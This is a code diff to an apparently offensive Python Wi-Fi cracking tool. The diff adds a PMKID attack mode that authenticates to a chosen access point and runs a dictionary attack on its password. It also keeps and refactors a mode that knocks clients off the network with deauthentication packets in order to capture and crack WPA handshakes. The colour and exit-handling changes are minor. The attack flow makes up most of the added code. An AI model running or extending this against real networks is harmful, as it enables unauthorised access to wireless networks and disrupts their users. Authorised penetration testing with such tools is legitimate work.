@@ -19,6 +19,7 @@ from wireless import Shifter
 from wireless import Sniper
 from wireless import PSK
 from wireless import eAPoL
+from wireless import PMKID
 from scapy.utils import rdpcap
 from scapy.utils import PcapWriter
 from utils import tabulate
@@ -29,19 +30,6 @@ DICTIONARY = ''
 NEW_HAND = False
 V__ = bool(0)
 _KEY_ = None
-
-class Color:
-	WHITE = '\033[0m'
-	PURPLE = '\033[95m'
-	CYAN = '\033[96m'
-	DARKCYAN = '\033[36m'
-	BLUE = '\033[94m'
-	GREEN = '\033[92m'
-	YELLOW = '\033[93m'
-	RED = '\033[91m'
-	BOLD = '\033[1m'
-	UNDERLINE = '\033[4m'
-	END = '\033[0m'
 
 class interface:
 
@@ -161,7 +149,7 @@ class Sniffer:
 		self.aps()
 
 	def aps(self):
-		pull.up('Scanning through the Area. Press [%sCTRL+C%s] to Stop. ' % (color.BOLD, color.END))
+		pull.up('Scanning through the Area. Press [%sCTRL+C%s] to Stop. ' % (pull.BOLD, pull.END))
 		time.sleep(1)
 		self.screen = Display()
 		thread = threading.Thread(target=self.screen.Shifter, args=(self.shift, self.iface1,), name="Verbose Sniffer")
@@ -176,7 +164,7 @@ class Sniffer:
 		self.screen.clear()
 		del self.screen
 
-		__HEADERS = [color.BOLD+'NO', 'ESSID', 'PWR', 'ENC', 'CIPHER', 'AUTH', 'CH', 'BSSID'+color.END]
+		__HEADERS = [pull.BOLD+'NO', 'ESSID', 'PWR', 'ENC', 'CIPHER', 'AUTH', 'CH', 'BSSID'+pull.END]
 		tabulator__ = []
 		###
 		__sig_LIST = []
@@ -294,14 +282,14 @@ class Phazer:
 				for tup in cls__:
 					if V__:
 						pull.up('Attempting to Dissociate %s from AP. Detected Range: %d'\
-								 % (color.RED+tup[0].upper()+color.END, tup[1] if tup[1] != -999 else -1))
+								 % (pull.RED+tup[0].upper()+pull.END, tup[1] if tup[1] != -999 else -1))
 					else:
 						pull.up('Attempting to Dissociate %s from Access Point.'\
-									 % (color.RED+tup[0].upper()+color.END))
+									 % (pull.RED+tup[0].upper()+pull.END))
 					pkts__ = self.sniper.shoot(tup[0], deauth)
 					if V__:
 						pull.up('Checking For Valid Handshake b/w "%s" and "%s"'\
-									 % (color.BOLD+ap['essid']+color.END, color.BOLD+tup[0].upper()+color.END))
+									 % (pull.BOLD+ap['essid']+pull.END, pull.BOLD+tup[0].upper()+pull.END))
 					if pkts__[0]:
 						y_h = not False
 						if V__:
@@ -339,11 +327,48 @@ class Phazer:
 		if not os.path.exists(directory):
 			os.makedirs(directory)
 
+class pmkid_GEN:
+
+	def __init__(self, iface_instance, ap_instance):
+		self.ap_instance = ap_instance
+		self.iface_instance = iface_instance
+		self.pmkid = PMKID(self.ap_instance['bssid'], self.ap_instance['essid'], self.iface_instance.iface, self.ap_instance['beacon'], DICTIONARY, _KEY_, pull, V__)
+		self.channel = self.channel(self.ap_instance['channel'])
+
+	def auth_gen(self):
+		return self.pmkid.dev_conn()
+
+	def asso_gen(self):
+		return self.pmkid.asso_conn()
+
+	def lets_crack(self):
+		_pass, _hash, _hash_ = self.pmkid.crack()
+		if _pass is None:
+			pull.error("Password Not Found in Dictionary. Try enlarging it!")
+			sys.exit()
+		else:
+			pull.use("Password Found: %s%s%s" % (pull.BOLD, _pass, pull.END))
+			if V__:
+				pull.right("PMKID: ")
+				print _hash_
+				pull.right("PMK: ")
+				print _hash
+
+	def channel(self, _ch):
+		self.iface_instance.put_channel(_ch)
+		return _ch
+
+def grace_exit(sig, frame):
+	pull.up("Closing. Cleaning up the mess! ")
+	time.sleep(2)
+	sys.exit(0)
+
 def main():
 	global WRITE__, DICTIONARY, NEW_HAND, V__, _KEY_
 
 	parser = optparse.OptionParser(add_help_option=False)
 	parser.add_option('-h', '--help', dest='help', default=False, action="store_true", help="Show this help manual")
+	parser.add_option('-m', '--mode', dest='mode', type='int', default=1, help="Mode to Use. ")
 	parser.add_option('-i', '--interface', dest="interface", type='string', help="Monitor Wireless Interface to use")
 	parser.add_option('-e', '--essid', dest="essid", type='string', help="Targets AP's with the specified ESSIDs")
 	parser.add_option('-b', '--bssid', dest="bssid", type='string', help="Targets AP's with the specified BSSIDs")
@@ -412,29 +437,33 @@ def main():
 		pull.info("No Network has been Specified. ")
 		sniffer = Sniffer(iface)
 
-	phaser = Phazer(sniffer)
-	target = phaser.get_input()
-	signal(SIGINT, lambda sig, frame: sys.exit())
-	pull.info("You've choosed \"%s\" with encryption %s" % (target['essid'], target['auth']))
-	if not phaser.verify_h_crack(target['bssid'])[0] or NEW_HAND == True:
-		if NEW_HAND:
-			d_carded__ = phaser.discard_p_hand(target['bssid'])
-			if d_carded__:
-				pull.delete('Discarded Previous Handshake for "%s"' % (color.BOLD+target['essid']+color.END))
-			else:
-				pull.info('Attempting to Capture new handshake for "%s"' % (color.BOLD+target['essid']+color.END))
-		phaser.d_h_crack(target, int(options.timeout), options.deauth)
-	else:
-		pull.use("We've already got the handshake for this network. Attempting to Crack it.")
-		phaser.h_crack(target, phaser.verify_h_crack(target['bssid'])[1])
+	if options.mode == 1:
+		phaser = Phazer(sniffer)
+		target = phaser.get_input()
+		signal(SIGINT, grace_exit)
+		pull.info("You've choosed \"%s\" with encryption %s" % (target['essid'], target['auth']))
+		if not phaser.verify_h_crack(target['bssid'])[0] or NEW_HAND == True:
+			if NEW_HAND:
+				d_carded__ = phaser.discard_p_hand(target['bssid'])
+				if d_carded__:
+					pull.delete('Discarded Previous Handshake for "%s"' % (pull.BOLD+target['essid']+pull.END))
+				else:
+					pull.info('Attempting to Capture new handshake for "%s"' % (pull.BOLD+target['essid']+pull.END))
+			phaser.d_h_crack(target, int(options.timeout), options.deauth)
+		else:
+			pull.use("We've already got the handshake for this network. Attempting to Crack it.")
+			phaser.h_crack(target, phaser.verify_h_crack(target['bssid'])[1])
+	elif options.mode == 2:
+		pmk = pmkid_GEN(iface, Phazer(sniffer).get_input())
+		signal(SIGINT, grace_exit)
+		if pmk.auth_gen():
+			if pmk.asso_gen():
+				pmk.lets_crack()
 
 if __name__ == "__main__":
-
-	color = Color()
 	pull = Pully()
 	pull.logo()
-	if os.name != 'posix':
-		pull.error("Sorry, but the Operating System isn't supported")
-		sys.exit(-1)
-
+	if not 'linux' in sys.platform:
+		pull.error("Not Supportable Operating System!")
+		sys.exit(1)
 	main()
